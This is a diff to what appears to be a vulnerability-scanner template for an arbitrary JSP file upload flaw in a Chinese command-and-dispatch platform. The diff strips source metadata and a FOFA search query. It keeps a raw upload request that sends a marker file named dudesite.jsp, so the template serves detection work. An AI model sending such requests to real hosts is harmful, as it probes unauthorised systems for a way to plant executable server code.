@@ -3,12 +3,8 @@ info:
   name: 可视化融合指挥调度平台 alarmConfig接口 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xskyqzy3qqk2yodu'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xskyqzy3qqk2yodu
-    fofa: body="base/searchInfoWindow_min.cs
 http:
 - raw:
   - 'POST /dispatch/alarm/alarmConfig/upload HTTP/1.1
@@ -32,14 +28,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
 
 
-
-
     ------WebKitFormBoundary7ctER307B0RaQwOp
 
 
     Content-Disposition: form-data; name="file";filename="dudesite.jsp"
-
-
 
 
     123456
